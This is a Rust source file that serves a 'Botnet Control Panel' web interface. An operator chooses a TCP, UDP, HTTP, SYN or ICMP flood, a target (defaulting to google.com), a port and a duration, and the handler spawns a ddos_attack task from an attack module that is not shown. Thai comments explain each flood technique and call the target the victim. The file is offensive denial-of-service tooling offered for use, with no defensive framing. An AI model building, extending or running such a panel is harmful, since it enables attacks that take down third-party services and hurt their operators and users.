use warp::Filter;
use tokio::net::TcpListener;
use crate::attacks::ddos_attack;
use std::error::Error;

pub async fn run_web_frontend() -> Result<(), Box<dyn Error + Send + Sync>> {
    let index = warp::path::end().map(|| {
        warp::reply::html(r##"
        <html>
        <head><title>Botnet Control</title></head>
        <body>
        <h1>Botnet Control Panel</h1>
        <p>Select attack type, enter target, and duration.</p>
        <form method="post" action="/send">
        Attack Type: <select name="attack_type">
        <option value="tcp">TCP Flood</option>
        <option value="udp">UDP Flood</option>
        <option value="http">HTTP Flood</option>
        <option value="syn">SYN Flood</option>
        <option value="icmp">ICMP Flood</option>
        </select><br>
        <p>ประเภทการโจมตี: เทคนิคการทำ DDoS (Distributed Denial of Service)<br>
        TCP Flood: การส่งแพ็กเก็ต TCP จำนวนมหาศาลไปกวนการเชื่อมต่อ<br>
        UDP Flood: การส่งแพ็กเก็ต UDP สุ่มพอร์ตไปที่เป้าหมาย เพื่อให้เครื่องเป้าหมายเสียทรัพยากรในการตรวจสอบและตอบกลับ<br>
        HTTP Flood: การจำลองการส่งคำขอเปิดหน้าเว็บ (GET/POST requests) รัวๆ เพื่อให้ Web Server ทำงานหนักจนล่ม<br>
        SYN Flood: การส่งแพ็กเก็ตขอเชื่อมต่อ (SYN) ไปรัวๆ แต่ไม่ยอมเชื่อมต่อให้เสร็จ (ไม่ส่ง ACK กลับ) ทำให้ Server รอเก้อจนทรัพยากรหมด (Half-open connections)<br>
        ICMP Flood: หรือ Ping Flood คือการยิง Ping ไปรัวๆ ให้ Bandwidth เต็ม</p>
        Target: <input name="target" id="target" value="google.com" size="50" oninput="autoSetPort()"><br>
        <p>เป้าหมาย: ใส่ชื่อ Domain หรือ IP Address ของเหยื่อ (ในภาพคือ google.com)</p>
        Port (for TCP/UDP/SYN): <input name="port" id="port" value="80" type="number" min="1" max="65535"><br>
        <p>ช่องทางที่จะโจมตี (ในภาพใส่ 80 ซึ่งเป็นพอร์ตมาตรฐานของ Web Server HTTP)</p>
        Duration (seconds): <input name="duration" value="60" type="number" min="1"><br>
        <p>ระยะเวลาที่จะสั่งให้บอทระดมยิง (ในภาพใส่ 60 วินาที)</p>
        <input type="submit" value="Start Attack">
        </form>
        <script>
        function autoSetPort() {
            const target = document.getElementById('target').value;
            const portInput = document.getElementById('port');
            if (target.startsWith('https://')) {
                portInput.value = 443;
            } else if (target.startsWith('http://')) {
                portInput.value = 80;
            } else if (target.includes(':')) {
                const parts = target.split(':');
                if (parts.length > 1) {
                    const port = parseInt(parts[parts.length - 1]);
                    if (!isNaN(port) && port > 0 && port <= 65535) {
                        portInput.value = port;
                    }
                }
            } else {
                // Default for plain domain/IP
                portInput.value = 80;
            }
        }
        // Set initial port
        autoSetPort();
        </script>
        </body>
        </html>
        "##)
    });

    let send = warp::path("send")
        .and(warp::post())
        .and(warp::body::form())
        .map(|form: std::collections::HashMap<String, String>| {
            let attack_type = form.get("attack_type").unwrap_or(&"tcp".to_string()).clone();
            let target = form.get("target").unwrap_or(&"".to_string()).clone();
            let port_str = form.get("port").unwrap_or(&"80".to_string()).clone();
            let port: u16 = port_str.parse().unwrap_or(80);
            let duration_str = form.get("duration").unwrap_or(&"60".to_string()).clone();
            let duration: u64 = duration_str.parse().unwrap_or(60);
            let attack_type_clone = attack_type.clone();
            let target_clone = target.clone();
            tokio::spawn(async move {
                ddos_attack(attack_type_clone, target_clone, port, duration).await;
            });
            let response_html = format!(r##"
            <html>
            <head><title>Attack Status</title></head>
            <body>
            <h1>Attack Started! / การโจมตีเริ่มแล้ว!</h1>
            <p>Type: {} / ประเภท: {}</p>
            <p>Target: {} / เป้าหมาย: {}</p>
            <p>Duration: {} seconds / ระยะเวลา: {} วินาที</p>
            <p id="countdown">Time remaining: {} seconds / เหลือเวลา: {} วินาที</p>
            <script>
            let timeLeft = {};
            const countdownEl = document.getElementById('countdown');
            const timer = setInterval(() => {{
                timeLeft--;
                countdownEl.textContent = 'Time remaining: ' + timeLeft + ' seconds / เหลือเวลา: ' + timeLeft + ' วินาที';
                if (timeLeft <= 0) {{
                    clearInterval(timer);
                    countdownEl.textContent = 'Attack completed! / การโจมตีเสร็จสิ้น!';
                }}
            }}, 1000);
            </script>
            <a href='/'>Back / กลับ</a>
            </body>
            </html>
            "##, attack_type, attack_type, target, target, duration, duration, duration, duration, duration);
            warp::reply::html(response_html)
        });

    let routes = index.or(send);
    let listener = TcpListener::bind("127.0.0.1:0").await?;
    let port = listener.local_addr()?.port();
    drop(listener);
    println!("Botnet web interface running on http://127.0.0.1:{}", port);
    warp::serve(routes).run(([127, 0, 0, 1], port)).await;
    Ok(())
}